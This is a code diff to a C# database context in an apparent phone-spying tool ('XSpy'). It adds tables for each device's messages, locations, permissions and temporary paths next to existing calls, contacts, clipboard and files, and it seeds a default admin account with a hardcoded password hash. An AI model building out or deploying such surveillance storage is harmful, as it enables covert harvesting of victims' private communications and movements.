@@ -16,9 +16,15 @@ namespace XSpy.Database
         protected override void OnModelCreating(ModelBuilder modelBuilder)
         {
             modelBuilder.Entity<User>().HasOne(s => s.RankData);
+            
             modelBuilder.Entity<Device>().HasMany(s => s.Contacts).WithOne(s => s.DeviceData);
             modelBuilder.Entity<Device>().HasMany(s => s.Calls).WithOne(s => s.DeviceData);
-            
+            modelBuilder.Entity<Device>().HasMany(s => s.Messages).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Device>().HasMany(s => s.Permissions).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Device>().HasMany(s => s.Locations).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Device>().HasMany(s => s.TempPaths).WithOne(s => s.DeviceData);
+            modelBuilder.Entity<Rank>().HasMany(s => s.Roles).WithOne(s => s.Rank);
+
 
             AddDataSeed(modelBuilder);
 
@@ -71,7 +77,6 @@ namespace XSpy.Database
             modelBuilder.Entity<User>().HasData(new User()
             {
                 Id = userId,
-                Username = "admin",
                 Email = "admin@admin.com",
                 IsActive = true,
                 Password = "$2a$11$SsDzjmfewhAt.q/aLjmfTeqGFEtlNNO08mmw023eQYV6WBJMktDzS",
@@ -93,14 +98,17 @@ namespace XSpy.Database
                 SystemVersion = "10",
                 UserId = userId
             });
-
         }
 
 
         public DbSet<User> Users { get; set; }
         public DbSet<Rank> Ranks { get; set; }
+        public DbSet<RankRole> RankRoles { get; set; }
+        public DbSet<Roles> Roles { get; set; }
+
         public DbSet<Device> Devices { get; set; }
         public DbSet<Call> Calls { get; set; }
+        public DbSet<TempPath> TempPaths { get; set; }
         public DbSet<Clipboard> Clipboards { get; set; }
         public DbSet<Contact> Contacts { get; set; }
         public DbSet<File> Files { get; set; }
